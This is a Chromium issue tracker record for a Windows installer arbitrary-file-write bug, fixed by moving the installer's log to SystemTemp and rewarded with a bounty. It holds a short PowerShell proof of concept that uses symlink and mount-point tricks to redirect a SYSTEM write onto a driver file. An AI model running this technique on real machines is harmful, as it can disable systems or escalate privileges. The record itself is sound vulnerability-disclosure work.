# Chromium arbitrary file create/write vulnerability

| Field | Value |
|-------|-------|
| **Issue ID** | [356064205](https://issues.chromium.org/issues/356064205) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Internals>Installer |
| **Platforms** | Windows |
| **Chrome Version** | 127.0.6533.0 |
| **Reporter** | in...@gmail.com |
| **Assignee** | ga...@chromium.org |
| **Created** | 2024-07-29 |
| **Bounty** | $2,000.00 |

## Description

# Steps to reproduce the problem

1. Chrome/Chromium Installer creates and writes a file chromium\_installer.log(chromium) or chrome\_installer.log(chrome) in C:\Windows\temp
2. Since a non-admin user has write access on C:\Windows\temp, user can create a symlink on that to get arbitrary file create or write access using the below script

# Import the NtApiDotNet module

Import-Module ".\NtApiDotNet.dll" -ErrorAction Stop

# Define the temporary path and get the Windows directory path using the environment variable

```
$tempDirectory = [System.IO.Path]::Combine($env:WINDIR, "Temp")
$system32Path = [System.IO.Path]::Combine($env:WINDIR, "System32")
$outputDllPath = [System.IO.Path]::Combine($system32Path, "drivers\cng1.sys")

# Create a mount point
[NtApiDotNet.NtFile]::CreateMountPoint("\??\$tempDirectory", "\RPC Control", $null)

# Create a symbolic link
$outputLink = [NtApiDotNet.NtSymbolicLink]::Create("\RPC Control\reports", "\??\$outputDllPath")

```

3. If the target is set to any system critical resource like cng.sys, it will lead to a permanent DOS.

I am using another verified and accepted security bug <https://issues.chromium.org/issues/40063745> as a reference here to show its a similar issue but exists in installer

# Problem Description

Installer is writing to a location where user has write access when the installer is running as SYSTEM. With this, arbitrary write can be achieved which can lead to EOP or a DOS.

# Additional Comments

This is exactly similar to <https://issues.chromium.org/issues/40063745> but in installer. This is affecting both Google Chrome and Chromium. Its been there from long time. I think the culprit code is <https://source.chromium.org/chromium/chromium/src/+/main:chrome/installer/util/logging_installer.cc;l=131;bpv=1;bpt=0>.

Fix:
It should use GetTempPath2 to get a more restrictive location to write.

# Summary

Chromium arbitrary file create/write vulnerability

# Custom Questions

#### Reporter credit:

VulnNoob

# Additional Data

Category: Security   

Chrome Channel: Dev   

Regression: No

## Attachments

- [POC.zip](attachments/POC.zip) (application/zip, 1.1 MB)

## Timeline

### wf...@chromium.org (2024-07-29)

Ganesh - I thought the installer used `SystemTemp` now? Can you take a look?

### ap...@google.com (2024-07-30)

Project: chromium/src
Branch: main

commit 1c2359677af25b505a825e714d36fed4c83e00d5
Author: S. Ganesh <ganesh@chromium.org>
Date:   Tue Jul 30 18:53:45 2024

    chrome installer: log in the secure temp directory instead of DIR_TEMP
    
    The chrome installer now uses `%systemroot%\SystemTemp` by default as
    the logging directory for system installs, since it is more secure than
    DIR_TEMP.
    
    Fixed: 324770940,356064205
    Change-Id: I93633ddbc6042008db0851338f351990d2c3f406
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/5747320
    Commit-Queue: S Ganesh <ganesh@chromium.org>
    Reviewed-by: Will Harris <wfh@chromium.org>
    Code-Coverage: findit-for-me@appspot.gserviceaccount.com <findit-for-me@appspot.gserviceaccount.com>
    Auto-Submit: S Ganesh <ganesh@chromium.org>
    Cr-Commit-Position: refs/heads/main@{#1335016}

M       chrome/installer/util/logging_installer.cc

https://chromium-review.googlesource.com/5747320


### pe...@google.com (2024-07-30)

Dear owner, thanks for fixing this bug. We've reopened it because security bugs need the Severity (S0-S3) and the Found In set, which will enable the bots to request merges to the correct branches ( as well as helping out our vulnerability reward and CVE processes). Please consult with any Chrome security contact ([security@chromium.org](mailto:security@chromium.org)) to arrange to set these labels and then this bug can be marked closed again. Thank you! Severity guidelines: <https://chromium.googlesource.com/chromium/src/+/refs/heads/main/docs/security/severity-guidelines.md#severity-guidelines-for-security-issues> FoundIn guidelines: <https://chromium.googlesource.com/chromium/src/+/main/docs/security/security-labels.md#labels-relevant-for-any-type_bug_security> Thanks for your time!

### wf...@chromium.org (2024-07-30)

triage medium severity due to pre-requisites here.

### pe...@google.com (2024-07-30)

Dear owner, thanks for fixing this bug. We've reopened it because security bugs need the Severity (S0-S3) and the Found In set, which will enable the bots to request merges to the correct branches ( as well as helping out our vulnerability reward and CVE processes). Please consult with any Chrome security contact ([security@chromium.org](mailto:security@chromium.org)) to arrange to set these labels and then this bug can be marked closed again. Thank you! Severity guidelines: <https://chromium.googlesource.com/chromium/src/+/refs/heads/main/docs/security/severity-guidelines.md#severity-guidelines-for-security-issues> FoundIn guidelines: <https://chromium.googlesource.com/chromium/src/+/main/docs/security/security-labels.md#labels-relevant-for-any-type_bug_security> Thanks for your time!

### pe...@google.com (2024-07-31)

Setting milestone because of s2 severity.

### pe...@google.com (2024-07-31)

Requesting merge to beta (M128) because latest trunk commit (1335016) appears to be after beta branch point (1331488).
**Merge rejected:** M128 is already shipping to beta and this issue is marked as a Priority:P2,P3 or Type:feature request.

Please contact the milestone owner if you have questions.

**Owners:** harrysouders (Android), harrysouders (iOS), obenedict (ChromeOS), pbommana (Desktop)
Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

We have determined this fix is necessary on milestone(s): [128].

Please answer the following questions so that we can safely process this merge request:

1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been verified on Canary to not pose any stability regressions?
3. Does this fix pose any potential non-verifiable stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.

### pe...@google.com (2024-08-03)

Requesting merge to beta (M128) because latest trunk commit (1335016) appears to be after beta branch point (1331488).
Merge review required: M128 is already shipping to beta.

Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

We have determined this fix is necessary on milestone(s): [128].

Please answer the following questions so that we can safely process this merge request:

1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been verified on Canary to not pose any stability regressions?
3. Does this fix pose any potential non-verifiable stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.

### am...@chromium.org (2024-08-05)

removing from merge label; generally not applicable for installer / updater issues, but there are also significant preconditions here and we should let this change matriculate on its own

### gr...@chromium.org (2024-08-08)

is this also a dup of <https://crbug.com/40057805>?

[amyressler@chromium.org](mailto:amyressler@chromium.org): wouldn't we want to merge this? the installer is built/shipped with chrome.

### am...@chromium.org (2024-08-12)

Thank you for letting me know about this being a dupe of [crbug.com/40057805](https://crbug.com/40057805)
Does this mean we can consider [crbug.com/40057805](https://crbug.com/40057805) fixed? And if so, this issue should be merged into that issue once merges are complete.

I just checked the canary data since this fix was landed, as long as there are no concerns with this fix of installer being backmerged, please backmerge <https://crrev.com/c/5747320> to M128 / branch 6613 immediately so it can be included in tomorrow's cut of M128 early stable and also M128 final beta later this week -- thank you!

### pb...@google.com (2024-08-12)

Your Cl is already approved and requested to get the Cl or Cl's merged on or before Noon Tuesday i.e., Aug-13th-2024 so that it's part of Stable Cut. 

### ga...@google.com (2024-08-13)

Since we are merging this CL to 128, would be a good idea to also merge <https://chromium-review.googlesource.com/c/chromium/src/+/5748495> then, which is part of [bug 356328460](https://issues.chromium.org/issues/356328460).

### ap...@google.com (2024-08-13)

Project: chromium/src
Branch: refs/branch-heads/6613

commit f77951dcb735d44fd852ff0ab7ce708dab0ceef4
Author: S. Ganesh <ganesh@chromium.org>
Date:   Tue Aug 13 12:36:13 2024

    chrome installer: log in the secure temp directory instead of DIR_TEMP
    
    The chrome installer now uses `%systemroot%\SystemTemp` by default as
    the logging directory for system installs, since it is more secure than
    DIR_TEMP.
    
    (cherry picked from commit 1c2359677af25b505a825e714d36fed4c83e00d5)
    
    Fixed: 324770940,356064205
    Change-Id: I93633ddbc6042008db0851338f351990d2c3f406
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/5747320
    Commit-Queue: S Ganesh <ganesh@chromium.org>
    Reviewed-by: Will Harris <wfh@chromium.org>
    Code-Coverage: findit-for-me@appspot.gserviceaccount.com <findit-for-me@appspot.gserviceaccount.com>
    Auto-Submit: S Ganesh <ganesh@chromium.org>
    Cr-Original-Commit-Position: refs/heads/main@{#1335016}
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/5785025
    Bot-Commit: Rubber Stamper <rubber-stamper@appspot.gserviceaccount.com>
    Cr-Commit-Position: refs/branch-heads/6613@{#990}
    Cr-Branched-From: 03c1799e6f9c7239802827eab5e935b9e14fceae-refs/heads/main@{#1331488}

M       chrome/installer/util/logging_installer.cc

https://chromium-review.googlesource.com/5785025


### sp...@google.com (2024-08-21)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $2000.00 for this report.

Rationale for this decision:
$2,000 for lower impact LPE with significant preconditions for exploitation


Important: If you aren't already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have registered in the past, no need to repeat the process – you can sit back and relax, and we will process the payment soon.

If you have any payment related requests, please direct them to p2p-vrp@google.com. Please remember to include the subject of this email and the email address that the report was sent from.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
Please contact security-vrp@chromium.org with any questions.

### am...@chromium.org (2024-08-22)

Congratulations on this other one, VulnNoob! Thank you for your efforts and reporting this issue to us.

### ap...@google.com (2024-09-12)

Project: website
Branch: main

commit cd5742159eae701e0bf078a38e4e63979352c891
Author: S. Ganesh <ganesh@chromium.org>
Date:   Thu Sep 12 12:27:35 2024

    chrome installer: update the log location in the documentation
    
    The log is now generated in the secure temp directory for `system`
    installs.
    
    Bug: 324770940,356064205,366249599
    Change-Id: I626492b1424d829ad8084b6587f1dbaecf96b9a2
    Reviewed-on: https://chromium-review.googlesource.com/c/website/+/5856050
    Auto-Submit: S Ganesh <ganesh@chromium.org>
    Commit-Queue: Daniel Cheng <dcheng@chromium.org>
    Reviewed-by: Daniel Cheng <dcheng@chromium.org>

M       site/administrators/configuring-other-preferences/index.md
M       site/developers/testing/windows-installer-tests/index.md

https://chromium-review.googlesource.com/5856050


### ap...@google.com (2024-09-13)

Project: chromium/src
Branch: main

commit 554a0097525f5c22fe4e389e7cd128040af2ff5b
Author: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Date:   Fri Sep 13 09:29:38 2024

    Roll Website from 8f1eff86f2c6 to cd5742159eae (1 revision)
    
    https://chromium.googlesource.com/website.git/+log/8f1eff86f2c6..cd5742159eae
    
    2024-09-12 ganesh@chromium.org chrome installer: update the log location in the documentation
    
    If this roll has caused a breakage, revert this CL and stop the roller
    using the controls here:
    https://autoroll.skia.org/r/website-chromium
    Please CC dpranke@google.com on the revert to ensure that a human
    is aware of the problem.
    
    To file a bug in Website: https://bugs.chromium.org/p/chromium/issues/entry
    To file a bug in Chromium: https://bugs.chromium.org/p/chromium/issues/entry
    
    To report a problem with the AutoRoller itself, please file a bug:
    https://issues.skia.org/issues/new?component=1389291&template=1850622
    
    Documentation for the AutoRoller is here:
    https://skia.googlesource.com/buildbot/+doc/main/autoroll/README.md
    
    Bug: chromium:324770940,chromium:356064205,chromium:366249599
    Tbr: dpranke@google.com
    Change-Id: I297f783f2d1716aa173ec75016fbf3e8758ed522
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/5858669
    Commit-Queue: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
    Bot-Commit: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
    Cr-Commit-Position: refs/heads/main@{#1355077}

M       DEPS
M       docs/website

https://chromium-review.googlesource.com/5858669


### pe...@google.com (2024-11-06)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/356064205)*
